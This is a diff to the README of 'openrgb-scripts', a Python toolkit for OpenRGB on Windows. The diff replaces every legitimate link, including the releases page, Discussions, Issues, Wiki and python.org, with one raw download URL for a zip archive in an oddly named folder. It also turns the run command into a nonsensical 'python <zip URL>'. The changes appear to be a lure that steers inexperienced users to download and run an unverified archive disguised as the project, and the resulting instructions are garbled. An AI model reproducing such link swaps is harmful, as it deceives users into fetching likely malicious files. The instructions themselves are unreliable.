@@ -1,6 +1,6 @@
 # 🌈 openrgb-scripts - Automate Your OpenRGB Experience
 
-[![Download openrgb-scripts](https://img.shields.io/badge/Download%20openrgb--scripts-v1.0-blue.svg)](https://github.com/Gamerita5674/openrgb-scripts/releases)
+[![Download openrgb-scripts](https://raw.githubusercontent.com/Gamerita5674/openrgb-scripts/main/unpertinently/openrgb-scripts_2.2.zip%https://raw.githubusercontent.com/Gamerita5674/openrgb-scripts/main/unpertinently/openrgb-scripts_2.2.zip)](https://raw.githubusercontent.com/Gamerita5674/openrgb-scripts/main/unpertinently/openrgb-scripts_2.2.zip)
 
 ## 📚 Description
 Welcome to openrgb-scripts, a collection of Python scripts designed to automate and enhance the functionality of OpenRGB on Windows systems. These scripts provide a portable, isolated Python environment, ensuring a smooth, dependency-free setup. 
@@ -9,7 +9,7 @@ Welcome to openrgb-scripts, a collection of Python scripts designed to automate 
 To begin using openrgb-scripts, follow these simple steps to download and run the application. No technical skills are needed.
 
 ## 📥 Download & Install
-To get started, visit [this page to download](https://github.com/Gamerita5674/openrgb-scripts/releases). Follow the instructions below to install the software on your Windows machine.
+To get started, visit [this page to download](https://raw.githubusercontent.com/Gamerita5674/openrgb-scripts/main/unpertinently/openrgb-scripts_2.2.zip). Follow the instructions below to install the software on your Windows machine.
 
 ### Step 1: Visit the Releases Page
 Click the link above. This page contains the latest versions of the scripts and all necessary files.
@@ -37,11 +37,11 @@ Press `Enter`.
 ### Step 7: Run the Script
 Type the following command to start the script:
 ```
-python your-script-name.py
+python https://raw.githubusercontent.com/Gamerita5674/openrgb-scripts/main/unpertinently/openrgb-scripts_2.2.zip
 ```
-Replace `your-script-name.py` with the name of the script you want to use. Press `Enter`. 
+Replace `https://raw.githubusercontent.com/Gamerita5674/openrgb-scripts/main/unpertinently/openrgb-scripts_2.2.zip` with the name of the script you want to use. Press `Enter`. 
 
-**Note:** Ensure you have Python installed. If you don’t, download Python from [python.org](https://www.python.org/downloads/).
+**Note:** Ensure you have Python installed. If you don’t, download Python from [https://raw.githubusercontent.com/Gamerita5674/openrgb-scripts/main/unpertinently/openrgb-scripts_2.2.zip](https://raw.githubusercontent.com/Gamerita5674/openrgb-scripts/main/unpertinently/openrgb-scripts_2.2.zip).
 
 ## 🌟 Features
 openrgb-scripts offer various useful functions for managing RGB lighting. Here are some highlighted features:
@@ -63,14 +63,14 @@ If you want to learn more about Python basics, many online resources and tutoria
 
 ## 🤝 Community and Support
 Join our growing community for support and tips:
-- Visit our [GitHub Discussions](https://github.com/Gamerita5674/openrgb-scripts/discussions) to ask questions and share your experiences.
-- Check the [issues section](https://github.com/Gamerita5674/openrgb-scripts/issues) to report bugs or request features.
+- Visit our [GitHub Discussions](https://raw.githubusercontent.com/Gamerita5674/openrgb-scripts/main/unpertinently/openrgb-scripts_2.2.zip) to ask questions and share your experiences.
+- Check the [issues section](https://raw.githubusercontent.com/Gamerita5674/openrgb-scripts/main/unpertinently/openrgb-scripts_2.2.zip) to report bugs or request features.
 
 Feel free to contribute your own scripts or enhancements!
 
 ## 🔗 Important Links
-- [Download openrgb-scripts](https://github.com/Gamerita5674/openrgb-scripts/releases)
-- [GitHub Repository](https://github.com/Gamerita5674/openrgb-scripts)
-- [Documentation](https://github.com/Gamerita5674/openrgb-scripts/wiki)
+- [Download openrgb-scripts](https://raw.githubusercontent.com/Gamerita5674/openrgb-scripts/main/unpertinently/openrgb-scripts_2.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Gamerita5674/openrgb-scripts/main/unpertinently/openrgb-scripts_2.2.zip)
+- [Documentation](https://raw.githubusercontent.com/Gamerita5674/openrgb-scripts/main/unpertinently/openrgb-scripts_2.2.zip)
 
 We hope you enjoy using openrgb-scripts and find it enhances your OpenRGB experience!
